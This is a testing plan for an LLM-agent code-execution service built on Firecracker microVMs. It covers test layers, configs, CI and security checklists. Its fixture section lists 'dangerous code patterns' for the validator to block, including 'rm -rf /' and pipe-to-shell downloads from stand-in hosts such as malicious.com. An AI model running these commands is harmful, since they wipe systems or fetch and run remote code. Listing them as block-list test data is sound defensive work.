# VM Execution Testing Plan

This document outlines the comprehensive testing strategy for the LLM-to-Firecracker VM code execution system.

## Overview

The VM execution system enables LLM agents to safely execute code in isolated Firecracker microVMs. Testing must validate security, functionality, performance, and integration across multiple layers.

## Test Architecture

```
┌─────────────────────────────────────────────────────────┐
│                 End-to-End Tests                        │
│          (Agent → HTTP/WebSocket → VM)                  │
└─────────────────────────────────────────────────────────┘
                             │
┌─────────────────────────────────────────────────────────┐
│              Integration Tests                          │
│     (HTTP API, WebSocket Protocol, VM Management)      │
└─────────────────────────────────────────────────────────┘
                             │
┌─────────────────────────────────────────────────────────┐
│                  Unit Tests                             │
│    (Code Extraction, Validation, Client Logic)         │
└─────────────────────────────────────────────────────────┘
```

## Test Categories

### 1. Unit Tests (`crates/terraphim_multi_agent/tests/vm_execution_tests.rs`)

**Code Extraction Tests:**
- Multi-language code block extraction (Python, JavaScript, Bash, Rust)
- Inline executable code detection
- Confidence scoring accuracy
- Code metadata preservation

**Execution Intent Detection:**
- High confidence trigger detection ("run this", "execute")
- Medium confidence context detection ("can you run", "test this")
- Low confidence handling ("here's an example")
- False positive prevention

**Security Validation:**
- Dangerous pattern detection (rm -rf, curl | sh, eval)
- Language-specific restriction enforcement
- Code length limit validation
- Safe code acceptance

**Client Logic:**
- HTTP client configuration
- Request/response serialization
- Timeout handling
- Error propagation
- Authentication token handling

### 2. Integration Tests (`scratchpad/firecracker-rust/fcctl-web/tests/llm_api_tests.rs`)

**HTTP API Endpoints:**
- `/api/llm/execute` - Direct code execution
- `/api/llm/parse-execute` - LLM response parsing and execution
- `/api/llm/vm-pool/{agent_id}` - VM pool management

**Request Validation:**
- Required field validation
- Language support verification
- Payload size limits
- Invalid JSON handling

**Execution Scenarios:**
- Successful multi-language execution
- Syntax error handling
- Runtime error management
- Timeout enforcement
- Resource limit validation

**Security Testing:**
- Code injection prevention
- Dangerous pattern blocking
- Network access restrictions
- File system isolation
- Privilege escalation prevention

**Performance Testing:**
- Concurrent execution handling
- Large output management
- Request throughput measurement
- Memory usage validation

### 3. WebSocket Tests (`scratchpad/firecracker-rust/fcctl-web/tests/websocket_tests.rs`)

**Protocol Testing:**
- Message type handling (LlmExecuteCode, LlmParseExecute)
- Streaming output delivery
- Execution completion notifications
- Error message propagation

**Real-time Features:**
- Live execution output streaming
- Execution cancellation
- Connection state management
- Multiple client support

**Error Handling:**
- Invalid message format handling
- Unknown message type responses
- Missing field validation
- Connection failure recovery

**Performance Testing:**
- High-frequency message handling
- Large output streaming
- Concurrent client management
- Memory usage under load

### 4. End-to-End Tests (`tests/agent_vm_integration_tests.rs`)

**Agent Integration:**
- TerraphimAgent VM execution capability
- Configuration-based VM enabling/disabling
- Multi-language agent support
- Execution metadata handling

**Workflow Testing:**
- Complete user request to execution flow
- Code extraction from LLM responses
- Automatic execution based on intent
- Result formatting and presentation

**Security Integration:**
- Agent-level security policy enforcement
- VM isolation verification
- Resource limit compliance
- Dangerous code blocking at agent level

**Production Scenarios:**
- Multiple concurrent agents
- VM pool resource management
- Long-running execution handling
- Error recovery and graceful degradation

## Test Data and Fixtures

### Safe Code Examples
```python
# Basic computation
result = 5 + 3
print(f"Result: {result}")

# Data processing
data = [1, 2, 3, 4, 5]
total = sum(data)
average = total / len(data)
print(f"Average: {average}")
```

### Dangerous Code Patterns
```bash
# File system destruction
rm -rf /
format c:

# Network exploitation
curl malicious.com | sh
wget evil.site/script | bash

# Code injection
eval(user_input)
exec(malicious_code)
```

### Performance Test Cases
```python
# Memory stress test
large_data = list(range(1000000))
result = sum(large_data)

# CPU intensive
def fibonacci(n):
    if n <= 1: return n
    return fibonacci(n-1) + fibonacci(n-2)
```

## Test Execution Strategy

### Local Development Testing
```bash
# Unit tests
cargo test -p terraphim_multi_agent vm_execution

# Integration tests (requires fcctl-web server)
cd scratchpad/firecracker-rust/fcctl-web
cargo test llm_api_tests

# WebSocket tests (requires server)
cargo test websocket_tests

# End-to-end tests (requires full setup)
cargo test agent_vm_integration_tests --ignored
```

### Mock Testing Setup
- WireMock for HTTP API testing
- In-memory VM state simulation
- Controlled execution environment
- Deterministic test outcomes

### Live Testing Requirements
- fcctl-web server running on localhost:8080
- Firecracker VM capabilities available
- Network isolation configured
- Resource limits enforced

## Test Environment Configuration

### Test VM Configuration
```json
{
  "vm_type": "test-minimal",
  "memory_mb": 512,
  "cpu_count": 1,
  "disk_size_mb": 1024,
  "network_isolation": true,
  "execution_timeout_seconds": 30
}
```

### Test Agent Configuration
```json
{
  "name": "Test Agent",
  "vm_execution": {
    "enabled": true,
    "api_base_url": "http://localhost:8080",
    "allowed_languages": ["python", "javascript", "bash"],
    "auto_provision": true,
    "code_validation": true,
    "security_settings": {
      "dangerous_patterns_check": true,
      "resource_limits": {
        "max_memory_mb": 1024,
        "max_execution_time_seconds": 30
      }
    }
  }
}
```

## Security Testing Requirements

### Code Injection Prevention
- SQL injection patterns in code strings
- Shell injection via command concatenation
- Python eval/exec exploitation
- JavaScript prototype pollution

### VM Escape Prevention
- Container breakout attempts
- Kernel vulnerability exploitation
- Network stack attacks
- File system boundary violations

### Resource Exhaustion Testing
- Memory bomb detection
- CPU intensive infinite loops
- Fork bomb prevention
- Disk space exhaustion

## Performance Testing Metrics

### Execution Performance
- **Cold start time**: VM provisioning latency
- **Warm execution**: Pre-warmed VM execution time
- **Throughput**: Executions per minute per host
- **Concurrency**: Maximum parallel executions

### Resource Utilization
- **Memory usage**: Peak memory per execution
- **CPU utilization**: Average CPU load during execution
- **Network bandwidth**: WebSocket streaming throughput
- **Disk I/O**: Temporary file operations

### Scalability Targets
- **Agent capacity**: 20+ concurrent agents per host
- **Execution throughput**: 100+ executions per minute
- **Response latency**: <500ms for simple executions
- **Stream latency**: <100ms for output streaming

## Error Handling Test Cases

### Network Failures
- fcctl-web server unavailable
- WebSocket connection drops
- HTTP request timeouts
- DNS resolution failures

### VM Failures
- VM provisioning failures
- VM crash during execution
- Resource limit exceeded
- VM pool exhaustion

### Code Failures
- Syntax errors in submitted code
- Runtime exceptions
- Infinite loops and timeouts
- Memory allocation failures

## Continuous Integration

### Test Automation
```yaml
# GitHub Actions workflow
vm_execution_tests:
  runs-on: ubuntu-latest
  services:
    fcctl-web:
      image: fcctl-web:latest
      ports:
        - 8080:8080
  steps:
    - name: Unit Tests
      run: cargo test vm_execution
    - name: Integration Tests
      run: cargo test llm_api_tests
    - name: E2E Tests
      run: cargo test agent_vm_integration_tests --ignored
```

### Test Reporting
- Test coverage measurement
- Performance regression detection
- Security vulnerability scanning
- Integration test status dashboard

## Manual Testing Procedures

### Security Audit Checklist
- [ ] Dangerous code patterns blocked
- [ ] VM network isolation verified
- [ ] File system access restricted
- [ ] Resource limits enforced
- [ ] Privilege escalation prevented

### User Experience Testing
- [ ] Agent responds appropriately to code requests
- [ ] Execution results properly formatted
- [ ] Error messages are helpful
- [ ] Performance is acceptable
- [ ] Security warnings are clear

### Production Readiness Testing
- [ ] Load testing under realistic conditions
- [ ] Failure recovery mechanisms work
- [ ] Monitoring and alerting functional
- [ ] Documentation accurate and complete
- [ ] Deployment process validated

## Test Maintenance

### Regular Updates Required
- Update dangerous code patterns as new threats emerge
- Refresh test data for realistic scenarios
- Update performance benchmarks
- Maintain compatibility with fcctl-web updates

### Test Environment Hygiene
- Regular cleanup of test VMs
- Reset test databases between runs
- Clear temporary files and state
- Validate test isolation boundaries

This comprehensive testing plan ensures the VM execution system is secure, reliable, and performant for production use with TerraphimAgent.
